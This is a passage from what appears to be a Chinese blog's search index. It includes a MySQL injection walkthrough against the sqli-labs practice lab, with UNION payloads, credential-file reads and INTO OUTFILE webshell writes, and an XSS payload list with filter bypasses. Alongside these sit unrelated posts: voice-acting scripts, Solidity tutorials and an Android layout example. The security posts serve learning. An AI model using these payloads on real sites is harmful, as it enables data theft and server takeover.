load_file('/etc/password')`\n\t\t\t- 写文件\n\t\t\t\t- 写webshell到网站目录 \n\t\t\t\t\t- outfile (需要绝对路径) `（格式： select * into outfile \"文件地址\" 示例：select * info outfile 'f:/mysql/test/one' form teacher_class; ）`\n\n## TIPS\n\nmysql写shell\n>1.需要知道绝对路径(web下层目录)\n>2.用户需要file权限(root可写)，一般用户不会有file权限\n>3.文件大小小于max_allow_upload\n>4.secure_file_priv 指定可写目录\n\n写\n\t\n\tselect '<?php phpinfo();?>' into outfile 'c://php//www//kkk.php';\n\tselect '<?php phpinfo();?>' into dumpfile 'c://php//www//kkk2.php';\n\tselect * from user into outfile 'c://php//www/kkk4.php' fields terminated by '<?php phpinfo();?>'\n\n---\n\n## 实例\n\ntips:  \n> 查询数据的时候把信息记录到txt上\n\n\t# 判断是否存在sql注入 \n\thttp://127.0.0.1/Less-1/?id=2' \n\thttp://127.0.0.1/Less-1/?id=2' and '1'=2\n\n\t# 判断列数\n\thttp://127.0.0.1/Less-1/?id=2' order by 3--+\n\n\t# 判断输出信息位置 (union之前要报错才会查询union后面的)\n\thttp://127.0.0.1/Less-1/?id=99999' union select 1,2,3--+\n\n\t# 查库名\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(schema_name) from information_schema.schemata--+\n\n\t# 查表名 'security'/十六进制0x/database()\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(table_name) from information_schema.tables where table_schema='security'--+\n\n\t# 查数据 group_concat/concat_ws\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(username,0x7e,password) from security.users)--+\n\n\t# 查权限\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select user())--+ \n\n\t> root@localhost \n\n\t#  读文件 db-creds.inc 数据库配置文件\n\thttp://127.0.0.1/Less-1/?id=' union select 1,2,(select load_file('/var/www/html/sql-connections/db-creds.inc'))--+ \n\n\n\n## 相关链接\n\n[mysql官网](https://www.mysql.com/)  \n[mysql内置函数](https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html)    \n[ascii对照表](http://ascii.911cha.com/)  \n[mysql正则](http://www.runoob.com/mysql/mysql-regexp.html)  \n[MYSQL updatexml报错注入](https://blog.csdn.net/vspiders/article/details/77430024)  \n[Python Spider 的总结](https://blog.csdn.net/i_peter/article/details/53380334)  \n[MySQL手工注入步骤+直接写入一句话](https://blog.csdn.net/hxsstar/article/details/19337461)  \n[Mysql通过命令授于用户数据库操作权限](https://blog.csdn.net/m2417599488/article/details/72236666)  \n[mysql 函数执行权限](https://blog.csdn.net/zhaoyangjian724/article/details/52121193)  \n\n\n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"xss的语句","url":"/post/3180077102.html","content":"这是一个xss的闯关游戏  \n\n[下载链接:](https://pan.baidu.com/s/1bqtFVGrc4TlihuWT2TBxtQ)  \n提取码: isre  \n\nxss的语句\n\n\t1\n\t<script>alert(/xss/)</script>\n\t2\n\t\"><script>alert(/xss/)</script>\n\n\t3\n\n\t'onmouseover='alert(/xss/)'\n\n\t4\n\t\" oninput=alert`xss`//\n\t\" onfocus=alert`xss` autofocus= \"\n\t\" onchange=alert`xss` \"\n\n\n\t<img src=x onerror=alert(/xss/)>\n\n\t5\n\n\t\"><a href=javascript:alert(/xss/)>\n\n\t6\n\t\"><A HREF=javascript:alert(/xss/)>\n\n\t7\n\t\"><scrscriptipt>alert(/xss/)</scscriptript>\n\n\t8\n\thtml 字符实体编码转换\n\tjava&#x73;cript:alert(1)\n\n\t9\n\tjava&#x73;cript:alert(1)/*http://*/\n\n\t10\n\t&t_sort=a\" onclick=\"alert(1)\"\n\n\t15\n\turlencode\n\t%0a%0d\n\t<img%0asrc=xx%0aonerror=alert(/xss/)>\n\n## LINKS\n\n[xss_payload](http://html5sec.org/#html5)\n\n","tags":["web安全","xss"],"categories":["web安全"]},{"title":"cv古风剧本","url":"/post/1087166143.html","content":"\n\n<!--突然迷上了！！！！剧情yy就好了-->\n\n\n\n小生不才，未得姑娘青睐，打扰姑娘良久，姑娘莫怪，自此，所有爱慕之意止于唇齿，匿于年华。姑娘往南我变往北，在不叨扰，就此别过，望姑娘日后善其身，遇良人。予君欢喜城，暖色浮余生。若忆起昔日海誓山盟，笑笑了之。  \n\n这一天，一个采药师陪同他的弟弟，来到山中采药。不料，遇到了一群狼，两个人手里只有镰刀作为武器。采药师为了保护他的弟弟，说:“我去引开狼，你找到机会立刻下山。”弟弟不安道:“可是那你怎么办？”“不要管我，你还小，这是我作为哥哥的责任。”说罢，采药师大喊一声，引开狼群，弟弟趁机跑掉了。当弟弟快跑到山脚的时候，心里还是不放心，于是拿了一根结实的木棍，再次上山。当他还没走多久的时候，却看到自己的哥哥的尸体，里面的肉已经被全部吃掉，只剩下人皮。弟弟忍住不哭，把哥哥的皮装在篮子里，带回了家。当他回家了，看到了站在门口的父母，父母焦急的问:“李分珍，你怎么这么晚才回来？你哥呢？”这时候，细心的母亲发现篮子里有不同寻常的东西，问道:“分珍，篮子里面是什么？”这时候，李分珍再也忍不住了，大哭起来:“李时珍的皮！”  \n\n---\n\n湘灵：还记得这个地方吗？是否记得那一日，春光似酒浓，花故醉人香。  \n枫岫：姑娘大费周章，布置这一切，所为何来？  \n湘灵：呵，当年我们初逢醉花亭，一见如故，相谈甚欢，此后三日，朝起夕落，   秉烛促膝，共赏烟柳，共渡流光，我这样说，是否唤醒先生少许回忆呢？  \n枫岫：姑娘所言已是旧事  \n湘灵：虽是萍水相逢，但离别之际我曾问你，待来年春暖时节，可愿再叙？你当时回答：看罢春色终无味，秋霜丹叶更风情。因为这句，第二年枫红时节，我便在醉花亭中等候数个日夜，然而先生始终没有出现。  \n枫岫：那一句话，算不得承诺  \n湘灵：我明白，那句话不是承诺，只是忘情。我不辞千里，从四其界来到苦境，就是为了你。  \n枫岫：我不明白  \n湘灵：你说过，命运皆由自己掌握，幸福皆由自己开拓，如今我已打破樊篱，脱身牢笼，飞向向往的天空。  \n枫岫：这与我何关？  \n湘灵：在新的地方，新的身份，你我的缘份正要开始，我的目标就是你。跟随你的脚步，期待终有一天，能与你并肩同行  \n枫岫：姑娘...  \n湘灵：我的目的，就是先生的心  \n枫岫：你知道你在说什么吗？你对我根本不熟悉。  \n湘灵：我对你的熟悉，远比你所想还多，你以为我是欣赏你的文采，进而仰慕迷恋你吗？  \n枫岫：难道不是？  \n湘灵：当然不是，真正吸引我的，不是因为你出众的文采，或是精湛的内容，而是你  \n的灵魂   \n\n-----\n\n蝶澈(独白)我叫蝶澈，出生在巫乐族。我最喜欢的小哥哥名字叫迟墨，他是我们巫乐族的年龄最小的男孩子，我的小哥哥和我一样，是个灵力高强的孩子……他教我各种各样的幻术，教我怎样控制幻化成光线的琴弦，温柔的眉眼，微笑的唇角……   \n\n迟墨：蝶澈，你想过要飞到天空上面去看一看吗？我想知道，云朵上是开满了樱花，抑或是住满了亡灵。   \n\n蝶澈：（独白）我是我父皇的骄傲，可是迟墨不是，父皇不喜欢他……   \n\n迟墨：为什么那些鸟儿可以在天空里面自由地飞翔，而我却必须在风里面那么懦弱？   \n\n蝶澈：（独白）迟墨总是望着冰海对岸的方向很长时间不说话，他背对着我，我看不到他的眼睛，不过我可以想象，他的眼睛里面肯定落满了天空上飞鸟的影子。   \n\n迟墨：蝶澈，你想和我一起离开吗？  \n\n蝶澈：哥，你去哪我都跟着。  \n\n迟墨：（低声）蝶澈，我哪儿也不去，别忘记了，你是父皇最心爱的女儿。  \n\n蝶澈：（独白）我终于在祭坛的下面暗室中见到了我的哥哥迟墨，他被几把冰剑钉在厚厚的玄武岩墙壁上，红色的血液沿着那些穿刺他胸膛的冰冷源源不断地流淌下来，曼延在冰冷的地面上……他的表情没有痛苦和怨恨，依然平静而充满感恩。  \n\n迟墨：你已经知道一切了吧？  \n\n蝶澈：知道了，小哥哥。  \n\n迟墨：蝶澈，不要难过，我从来没有恨过父皇，更加喜欢你。我能够来这个世界上走一次，已经觉得很幸运了，请带我照顾父皇，照顾巫乐族的每一个人。  \n\n蝶澈：（独白）第三把冰剑洞穿他的胸膛，我听见血肉模糊的声音，沉闷如同粘稠的岩浆汩汩流动。 我看到哥哥皱紧的眉毛心如刀割。   \n\n迟墨：蝶澈，不要难过，还有两把冰凌。然后我就可以睡会了。   \n\n蝶澈：王为什么要对你这么残忍，我不允许。（独白）我走过去，召唤出手中的冰剑，一剑洞穿了他的咽喉。   \n\n迟墨：蝶澈，为什么这么傻，为了我而犯法典？  \n\n蝶澈：（独白）我最爱的哥哥……请你原谅我，我要离开了，离开这个纷扰的宫殿，离开这个埋葬了我苍翠年华的幻影之城。也许天的尽头，我会再次看见你的亡灵，那个时候，请你对我微笑，如同撕裂朝阳一样的微笑，让我可以笑着流完我的眼泪，然后让我听见你自由的，歌唱……  \n\n-----\n\n 前世，你和我一同相逢在轮回路上，那一刻，我就已经深深地将你的容颜铭记，镌刻在属于你和我的来世素笺上。  \n\n　　今生，你和我一同巧遇在古城径边，那一眼，我仍如此痴痴地将你的身影凝望，描绘在属于你和我的传奇长卷中。  \n　　前世的五百次回眸，才换得与你今生的擦肩而过。不知为何，我会如此深沉的将你记起…也许，在那五百次的思念中，在那五百次的回眸中，我已经累了，我已经倦了，我不想单单只是用回眸来念你，用思念来爱你，所以我要和你执手相依，然后同度漫漫红尘路，白头偕老。  \n　　我恨，为什么偏要我用五百次的回眸，才换得你今生的相守，我是多么的不甘，但我还是那样照做了，因为你是我喝下的一味情毒，我宁愿用回眸和思念来减轻爱你带来的伤痛，我宁愿那满带温柔的剧毒残忍地将我腐蚀掉，也不愿无情的岁月模糊你在我心中的绝世容颜。  \n　　如今，你平静的选择离我而去，仿若一阵风从我的世界里悄然消失，前世五百次对你的回眸变成一纸流烟消散，空落下满地凄凉，满地悲伤，我枕着孤独入睡，数着你给的伤痛度日，思念成疾。  \n　　思念，无日无夜的纠缠着我，伤痛，无止无休的侵蚀着我，那干涩的回忆，早已绵延成一条忧伤沉淀的长河，在那被历史风干的角落里，孤独的流淌，孤独的吟唱，曾时相守无猜的时光，被一幕幕回放，被一幕幕拉长…  \n　　回忆中，你的眸凝如春风明媚，带着我的丝丝眷念；  \n　　回忆中，你的唇艳似朝霞火红，带着我的凄凄缠绵；  \n　　回忆中，你的笑甜比清水可人，带着我的点点依恋；  \n　　依稀那年，微风轻轻地吹着，吹着你墨黑的长发，你和我站在柳湖边，看着那一对戏水的鸳鸯默默无言，时间仿佛静止了一般慢慢地蹒跚踱步，那是一段能够让人欢喜流泪的时光啊！那时候，你不知道我在想着，想着在前世的五百次回眸中我的心思，希望能在来世和你就这样相依静默，梳理着幽远宁静的时光，而这一刻，我终于实现了。  \n　　依稀那年，宁静的夜色委婉的映照在你清秀的脸上，月光如洗，流年静默，你依在我的身旁，啊，那一刻，我爱上了你，只用了一瞬间的时间，我是多么的幸福啊？如果没有前世那五百次对你的回眸，时间是否会为我们停留？也许，所有的一切都将被时间掩埋，碎成一丝残梦，我喜欢和你这样相守，等着你悠悠翻开前世我为你书写的那一封爱的素笺。  \n\n\n\n## LINKS\n\n[小生不才，仰慕姑娘许久，直至今日](https://www.lkxin.cn/archives/234.html)  \n[【宫妃祭】论那些精美的古风独白](https://tieba.baidu.com/p/4633724261?red_tag=0052093016)  \n[百鬼夜行](https://y.qq.com/n/yqq/song/002QopfF3YHIML.html)  \n\n","tags":["cv"],"categories":["biu"]},{"title":"solidity的代码","url":"/post/3799772689.html","content":"\n[在线solidityIDE](https://remix.ethereum.org)  \n[solidity](https://solidity.readthedocs.io)  \n\n## 类&函数\n\n\tpragma solidity ^0.4.25;\n\n\tcontract Demo1{\n\t    \n\t    // 创建一个函数\n\t    function shwo(int num) public returns(int,int){\n\t        return (num,num+1);\n\t    }\n\t}\n\n\n## int&uint\n\n\tpragma solidity ^0.4.25;\n\n\tcontract IntDemo{\n\t    \n\t    // 主要演示 int uint 的相关特性 ，如果没有指定步长默认是 int --> int256\n\t    function demo01() returns (int,uint,int){\n\t        int8 num = -128; // 1个字节8位，最高位为符号位 128～127\n\t        uint8 num2 = 255; // 1个字节8位，都是用来存储数据 0～255 0000 0000 - 1111 1111\n\t        \n\t        var num3 = num;\n\t        return (num,num2,num3);\n\t    }\n\t}\n\n## 属性&函数\n\n\tpragma solidity ^0.4.25;\n\n\t// 属性、函数、访问修饰符\n\tcontract AttrFnDemo{\n\t    \n\t    // 属性的默认访问修饰符：internal，但是函数默认访问修饰符public\n\t    uint private _age; // private 仅仅当前合约可以访问\n\t    \n\t    string internal _name; // 当前合约和子合约可以访问\n\t    \n\t    int public _num; // 外部可以直接调用\n\t    \n\t    function AttrFnDemo(uint age,string name,int num){\n\t        // this 代表当前合约（地址），但是不能直接和属性名称使用\n\t        _age = age;\n\t        _name = name;\n\t        _num = num;\n\t    }\n\t    // 构造函数在智能合约中不支持多态（重载）\n\t    // function AttrFnDemo() {}\n\t    \n\t    function age() private returns (uint){\n\t        return _age;\n\t    }\n\t    \n\t    function name() internal returns (string){\n\t        return _name;\n\t    }\n\t    \n\t    function num() public returns (int) {\n\t        return _num;\n\t    }\n\t    // 没有指定访问修饰符，默认为public\n\t    function show() returns (uint,string,int){\n\t        return (_age,name(),_num);\n\t    }\n\t    // solidity 默认普通的函数是支持多态性（重载）\n\t    // function show(int x) returns (uint,string,int){\n\t    //     return (_age,name(),_num);\n\t    // }\n\t    \n\t}\n\n## 继承&接口\n\n\tpragma solidity ^0.4.25;\n\n\tinterface Wifi{ // 定义接口，函数只有声明，没有实现\n\t    function wifi() public returns(string);\n\t}\n\n\tinterface BlueTooth{\n\t    function blue() public returns(string);\n\t}\n\t// solidity中，没有abstract，拥有抽象函数的合约就是抽象合约（不能够实例化）\n\tcontract Phone{\n\t    \n\t    // 抽象合约是不能够实例化\n\t    function start() internal returns (string){\n\t        return \"start phone\";\n\t    }\n\t    \n\t    // 实现手机关机的功能\n\t    function close() internal returns (string){\n\t        return \"close phone\";\n\t    }\n\t    \n\t    // 由于闹钟每个手机实现不相同，因此定义为抽象函数\n\t    function alarm() internal returns (string);\n\t}\n\n\t// Mi手机，实现闹钟，Wifi功能\n\tcontract Mi is Phone,Wifi{ // 继承与实现都可以使用is\n\t    \n\t    function wifi() public returns(string){\n\t        return \"Mi is show wifi\";\n\t    }\n\t    \n\t    function alarm() internal returns(string){\n\t        return \"Mi is show alarm\";\n\t    }\n\t    \n\t    function show() returns (string,string){\n\t        return (wifi(),alarm());\n\t    }\n\t    \n\t}\n\n\t// Iphone手机，实现全部功能\n\tcontract Iphone is Phone,Wifi,BlueTooth{\n\t    \n\t    function wifi() public returns(string){\n\t        return \"Iphone is show wifi\";\n\t    }\n\t    \n\t    function alarm() internal returns(string){\n\t        return \"Iphone is show alarm\";\n\t    }\n\t    \n\t    function blue() public returns(string){\n\t        return \"Iphone is show blue\";\n\t    }\n\t    \n\t    function show() returns (string,string){\n\t        return (start(),close());\n\t    }\n\t}\n\n## 实现一个转账功能\n\n    pragma solidity ^0.4.25;\n\n    // 此智能合约可以实现向合约的所有者转账的功能\n    contract PayableDemo{\n        \n        address public _owner; // 存储合约的所有者\n        \n        // 只有合约所有者才会调用构造函数\n        function PayableDemo() {\n            _owner = msg.sender; // sender：获取函数调用者的地址\n            \n        }\n        \n        // 创建一个函数，实现转账功能，转账函数必须有payable关键字\n        function transfer() payable{\n            _owner.transfer(msg.value); // value：在调用当前函数时，传入value值\n        }\n        \n        function showBalance() returns(address,uint256){\n            address _account = msg.sender;\n            return (_account,_account.balance);\n        }\n    }\n\n\n## 修改器&合约自毁\n\n    pragma solidity ^0.4.24;\n\n    // 此智能合约可以实现向合约的所有者转账的功能\n    contract PayableDemo{\n        \n        address public _owner; // 存储合约的所有者\n        // unint256 public _money;\n        \n        // 只有合约所有者才会调用构造函数\n        function PayableDemo() {\n            _owner = msg.sender; // sender：获取函数调用者的地址\n            // 合约创建者在创建合约时输入一定的金额\n            msg.value;\n        }\n        \n        // 创建一个函数，实现转账功能，转账函数必须有payable关键字\n        function transfer() payable{\n            _owner.transfer(msg.value); // value：在调用当前函数时，传入value值\n        }\n        \n        function showBalance() returns(address,uint256){\n            address _account = msg.sender;\n            return (_account,_account.balance);\n        }\n        \n        // 判断合约所有者的修改器（Java AOP）\n        modifier onlyOwner{\n            if (msg.sender!=_owner)\n                throw;\n            _; // 代表执行函数内部语句\n        }\n        \n        // 编写函数，实现合约自毁的功能\n        function kill(address addr) onlyOwner{\n            // 判断是否为合约所有者\n            selfdestruct(addr); // 销毁合约并且发送金额到指定地址\n        }\n    }\n\n## 重写修改器&打印日志\n\n    pragma solidity ^0.4.24;\n\n    contract PaySuper{\n        \n        // 属于默认缺省值：internal\n        address internal _owner; // 存储合约的所有者\n        \n        // 判断合约所有者的修改其（Java  Aop）\n        modifier onlyOwner{\n            if(msg.sender!=_owner)\n                throw;\n            _;\n        }\n    }\n\n    // 此智能合约可以实现向合约的所有者转账的功能\n    contract PayableDemo is PaySuper{\n        \n        event showMsg(string);\n        \n        // 只有合约所有者才会调用构造函数\n        function PayableDemo() payable{\n            _owner = msg.sender; // sender：获取函数调用者的地址\n            // 合约创建者在创建合约时输入一定的金额\n            msg.value;\n        }   \n        \n        // 创建一个函数，实现转账功能，转账函数必须有payable关键字\n        function transfer() payable{\n            _owner.transfer(msg.value); // value：在调用当前函数时，传入value值\n        }\n        \n        function showBalance() returns (address,uint256){\n            address _account = msg.sender;\n            return (_account,_account.balance);\n        }\n        \n        modifier onlyOwner{\n            showMsg('rewrite super class modifier');\n            if(msg.sender!=_owner)\n                throw;\n            _; // _代表执行函数内部语句\n        }\n        \n        // 编写函数，实现合约自毁的功能\n        function kill(address addr) onlyOwner{\n            // 判断是否为合约所有者\n            selfdestruct(addr);  // 销毁合约并且发送金额到指定地址\n        }\n        \n    }\n\n## 结构体&映射\n\n    pragma solidity ^0.4.24;\n\n    contract StructMapping{\n        \n        // 定义一个结构体\n        struct Product{\n            string name;\n            uint num;\n        }\n        \n        // 定义一个映射，来确定地址与产品的关系\n        mapping(address => Product) public proMap;\n        \n        // 定义一个函数，来实现产品初始化功能\n        function init01(string _name,uint _num) {\n            // 创建一个结构体对象（不需要new）\n            // proMap[msg.sender] = Product(name,num);\n            proMap[msg.sender] = Product({name:_name,num:_num});\n        }\n        \n        // 默认情况不能返回结构体类型\n        function show() returns(string,uint){\n            Product p = proMap[msg.sender];\n            return (p.name,p.num);\n        }\n    }\n\n\n## 众筹代码\n\n\tpragma solidity ^0.4.24;\n\n    //主要完成产品的众筹\n    contract CrowdFunding{\n        \n        // 投资者是结构体\n        struct Funder{\n            address addr; // 投资者地址\n            uint amount; // 投资金额\n        }\n        // 采用结构体来描述众筹产品\n        struct Product{\n            address addr; // 如果众筹成功,则金额会转到当前地址\n            uint goal; // 预期众筹的目标,如果达到此目标则说明众筹成功\n            uint amount; // 实际众筹的金额\n            uint funderNum; // 统计投资者的人数,缺省值为0\n            // 映射类型,统计当前产品的投资者\n            mapping(uint => Funder) funders;\n        }\n        \n         // 平台要统计众筹的产品数量\n        uint count;\n         // 此映射主要记录平台的众筹产品\n        mapping (uint => Product) public products;\n        // 添加众筹产品信息\n        function candidate(address addr, uint goal) returns (uint compaingnID){\n            // 结构体是不需要new,此处按照结构体声明的变量顺序进行赋值\n            products[count++] = Product(addr,goal*10**18,0,0);\n        }\n        \n         // 此函数实现对产品进行众筹功能\n        function vote(uint index) payable {\n            // 通过索引获取要众筹产品信息\n            Product p = products[index];\n            // 创建投资者,并且存储到产品众筹映射中\n            // msg.sender:当前函数调用者,就是众筹者, msg.value：众筹金额是调用函数时传入的value值\n            p.funders[p.funderNum++] = Funder({addr:msg.sender,amount:msg.value});\n            // 把当前众筹金额追加到amount中\n            p.amount += msg.value;\n        }\n        \n        // 检测当前产品众筹是否成功(如果成功则众筹金额转到产品提供的地址)\n        function check(uint index) payable returns (bool) {\n            Product p = products[index];\n            // 判断当前众筹金额是否大于设置金额\n            if (p.amount < p.goal) {\n                return false;\n            }\n            // 众筹成功,当前金额要转给产品地址\n            uint amount = p.amount;\n            // 初始化amount\n            p.amount = 0;\n            p.addr.transfer(amount); // 如果失败则返回为false\n            // transfer equal send \n            // if(!p.addr.send(amount)){\n            //     throw;\n            // }\n            return true;\n        }\n            \n        \n    }\n\n","tags":["区块链"],"categories":["区块链"]},{"title":"区块链学习","url":"/post/2435934763.html","content":"\n\n## 比特币\n[比特币区块](https://btc.com)  \n\n[区块链概念](https://anders.com/blockchain/)   \n\n[钱包](https://bitcoin.org/zh_CN/download)  \n\n[比特币总量](https://www.8btc.com/article/25065)  \n\n[BCT官网](https://www.bitcoincash.org)  \n\n[数字货币价格查询](https://www.feixiaohao.com)  \n\n[BTC历史分叉](http://www.btc798.com/articles/14863.html)  \n\n[ETH和EOS差异](http://www.sohu.com/a/216330641_481485)  \n\n[网页版钱包](https://www.blockchain.com/zh-cn/wallet#/)  \n\n[区块链专利排名](https://www.cybtc.com/article-2997-1.html)  \n\n**区块链项目**\n\n[支付宝爱心捐赠平台](https://bitrating.com/blockchain/85408.html)  \n\n[区块链游戏-CryptoKitties迷恋猫](https://www.cryptokitties.co)  \n\n[版权保护-百度图腾](http://c-chain.baidu.com/eco/index#/)  \n\n[百度图腾介绍](http://www.chinaz.com/news/2018/0412/872765.shtml)  \n\n---\n\n## 以太坊\n\n[eth](https://etherscan.io)  \n\n[solidity](https://solidity.readthedocs.io)  \n\n[remix IDE](https://remix.ethereum.org)  \n\n[以太坊单位换算](https://www.myetherwallet.com/helpers.html)  \n\n[solidity API博客](http://me.tryblockchain.org)  \n\n[solidity翻译API](http://www.tryblockchain.org)  \n\n[Hyperledger Fabric](#) \n\n---\n\n## EOS\n[eos](https://github.com/EOSIO/eos)    \n \n[EOS区块链开发指南](http://blog.eosdata.io/index.php/tag/eos/)  \n\n[EOS应用开发入门](https://www.jianshu.com/p/011c8f12857b)  \n\n[EOS中文白皮书](https://www.jianshu.com/p/f65bf7691482)  \n\n[eos的石墨烯技术是什么](https://blog.csdn.net/baidang201/article/details/76861624)  \n\n[eosio](https://eos.io/)  \n\n","tags":["区块链"],"categories":["区块链"]},{"title":"1.android布局-ConstraintLayout-约束布局-例子","url":"/post/1182005409.html","content":"\n## 前言\n\n> ConstraintLayout 出来也有一段时间，虽说也有很多坑，但是一些属性还是特别好用的，在项目中我也逐渐在使用，下面是用ConstraintLayout实现的一个标签栏的样式例子。\n\n[1.android布局-ConstraintLayout-约束布局](https://tea9.xyz/2018/07/03/1_android_layout_constraintlayout.html)  \n\n## 效果\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/20/1.jpg)\n\n## 思路\n\n\t1. 定义两条横向约束线(Guideline) \n\t2. 横向排列5个控件(TextView)\n\t3. 在每个TextView 下在来5个短横线(View)\n\t4. 最下方放置一个ViewPager\n\n## 代码\n\nactivity_tab_constraintlayout.xml  \n\n    <LinearLayout\n        android:orientation=\"vertical\"\n        xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:tools=\"http://schemas.android.com/tools\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\"\n        android:background=\"@android:color/white\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\">\n        <android.support.constraint.ConstraintLayout\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\">\n            <android.support.constraint.Guideline\n                android:id=\"@+id/guideline\"\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"match_parent\"\n                android:orientation=\"horizontal\"\n                app:layout_constraintGuide_begin=\"10dp\" />\n    \n            <android.support.constraint.Guideline\n                android:id=\"@+id/guideline1\"\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"match_parent\"\n                android:orientation=\"horizontal\"\n                app:layout_constraintGuide_begin=\"40dp\" />\n    \n            <TextView\n                android:id=\"@+id/tx1\"\n                app:layout_constraintTop_toTopOf=\"@id/guideline\"\n                app:layout_constraintLeft_toLeftOf=\"parent\"\n                app:layout_constraintRight_toLeftOf=\"@id/tx2\"\n                app:layout_constraintStart_toStartOf=\"parent\"\n                app:layout_constraintEnd_toStartOf=\"@id/tx2\"\n                style=\"@style/text2\"\n                android:text=\"@string/btn1\"/>\n            <TextView\n                android:id=\"@+id/tx2\"\n                app:layout_constraintTop_toTopOf=\"@id/guideline\"\n                app:layout_constraintLeft_toRightOf=\"@id/tx1\"\n                app:layout_constraintRight_toLeftOf=\"@id/tx3\"\n                app:layout_constraintStart_toEndOf=\"@id/tx1\"\n                app:layout_constraintEnd_toStartOf=\"@id/tx3\"\n                style=\"@style/text2\"\n                android:text=\"@string/btn2\"/>\n            <TextView\n                android:id=\"@+id/tx3\"\n                app:layout_constraintTop_toTopOf=\"@id/guideline\"\n                app:layout_constraintLeft_toRightOf=\"@id/tx2\"\n                app:layout_constraintRight_toLeftOf=\"@id/tx4\"\n                app:layout_constraintStart_toEndOf=\"@id/tx2\"\n                app:layout_constraintEnd_toStartOf=\"@id/tx4\"\n                style=\"@style/text2\"\n                android:text=\"@string/btn3\"/>\n            <TextView\n                android:id=\"@+id/tx4\"\n                app:layout_constraintTop_toTopOf=\"@id/guideline\"\n                app:layout_constraintLeft_toRightOf=\"@id/tx3\"\n                app:layout_constraintRight_toLeftOf=\"@id/tx5\"\n                app:layout_constraintStart_toEndOf=\"@id/tx3\"\n                app:layout_constraintEnd_toStartOf=\"@id/tx5\"\n                style=\"@style/text2\"\n                android:text=\"@string/btn4\"/>\n            <TextView\n                android:id=\"@+id/tx5\"\n                app:layout_constraintTop_toTopOf=\"@id/guideline\"\n                app:layout_constraintLeft_toRightOf=\"@id/tx4\"\n                app:layout_constraintRight_toRightOf=\"parent\"\n                app:layout_constraintStart_toEndOf=\"@id/tx4\"\n                app:layout_constraintEnd_toEndOf=\"parent\"\n                style=\"@style/text2\"\n                android:text=\"@string/btn5\"/>\n            <View\n                android:id=\"@+id/view1\"\n                android:visibility=\"visible\"\n                app:layout_constraintTop_toBottomOf=\"@id/tx1\"\n                app:layout_constraintStart_toStartOf=\"@id/tx1\"\n                app:layout_constraintEnd_toEndOf=\"@id/tx1\"\n                style=\"@style/short_line\" />\n            <View\n                android:id=\"@+id/view2\"\n                android:visibility=\"gone\"\n                app:layout_constraintTop_toBottomOf=\"@id/tx2\"\n                app:layout_constraintStart_toStartOf=\"@id/tx2\"\n                app:layout_constraintEnd_toEndOf=\"@id/tx2\"\n                style=\"@style/short_line\" />\n            <View\n                android:id=\"@+id/view3\"\n                android:visibility=\"gone\"\n                app:layout_constraintTop_toBottomOf=\"@id/tx3\"\n                app:layout_constraintStart_toStartOf=\"@id/tx3\"\n                app:layout_constraintEnd_toEndOf=\"@id/tx3\"\n                style=\"@style/short_line\"  />\n            <View\n                android:id=\"@+id/view4\"\n                android:visibility=\"gone\"\n                app:layout_constraintTop_toBottomOf=\"@id/tx4\"\n                app:layout_constraintStart_toStartOf=\"@id/tx4\"\n                app:layout_constraintEnd_toEndOf=\"@id/tx4\"\n                style=\"@style/short_line\"  />\n            <View\n                android:id=\"@+id/view5\"\n                android:visibility=\"gone\"\n                app:layout_constraintTop_toBottomOf=\"@id/tx5\"\n                app:layout_constraintStart_toStartOf=\"@id/tx5\"\n                app:layout_constraintEnd_toEndOf=\"@id/tx5\"\n                style=\"@style/short_line\"  />\n            <View\n                android:id=\"@+id/view6\"\n                app:layout_constraintTop_toBottomOf=\"@id/guideline1\"\n                android:background=\"@color/gray\"\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"10dp\"/>\n        </android.support.constraint.ConstraintLayout>\n        <android.support.v4.view.ViewPager\n            android:id=\"@+id/vp1\"\n            android:overScrollMode=\"never\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\">\n        </android.support.v4.view.ViewPager>\n    </LinearLayout>\n\n> 说明：这个布局为什么不直接用ConstraintLayout做根布局呢？\n> 因为 如果ViewPager里的布局使用RecyclerView最后一条或几条显示不全\n\n[关于ConstraintLayout与Recycleview使用中的一些坑](https://blog.csdn.net/android_mh/article/details/79022738)  \n\n---\n\nTabConstraintLayoutActivity.kt  \n\n\tclass TabConstraintLayoutActivity : AppCompatActivity(), View.OnClickListener {\n\t    override fun onClick(v: View?) {\n\t        when (v!!.id) {\n\t            R.id.tx1 -> vp1.currentItem = 0\n\t            R.id.tx2 -> vp1.currentItem = 1\n\t            R.id.tx3 -> vp1.currentItem = 2\n\t            R.id.tx4 -> vp1.currentItem = 3\n\t            R.id.tx5 -> vp1.currentItem = 4\n\t        }\n\t    }\n\n\t    var views = arrayListOf<View>()\n\n\t    override fun onCreate(savedInstanceState: Bundle?) {\n\t        super.onCreate(savedInstanceState)\n\t        setContentView(R.layout.activity_tab_constraintlayout)\n\t        initView()\n\t        initViewPager()\n\t        clearView()\n\t        clickView(1)\n\t    }\n\n\t    private fun initView() { // 初始化view\n\t        tx1.setOnClickListener(this)\n\t        tx2.setOnClickListener(this)\n\t        tx3.setOnClickListener(this)\n\t        tx4.setOnClickListener(this)\n\t        tx5.setOnClickListener(this)\n\t        val v1 = LayoutInflater.from(this).inflate(R.layout.item_text, null)\n\t        val v2 = LayoutInflater.from(this).inflate(R.layout.item_text, null)\n\t        val v3 = LayoutInflater.from(this).inflate(R.layout.item_text, null)\n\t        val v4 = LayoutInflater.from(this).inflate(R.layout.item_text, null)\n\t        val v5 = LayoutInflater.from(this).inflate(R.layout.item_text, null)\n\t        views.addAll(arrayListOf<View>(v1, v2, v3, v4, v5))\n\t    }\n\n\t    private fun initViewPager() { //初始化ViewPager\n\t        vp1.adapter = ViewPagerAdapter(views)\n\t        vp1.addOnPageChangeListener(object : ViewPager.OnPageChangeListener {\n\t            override fun onPageScrollStateChanged(p0: Int) 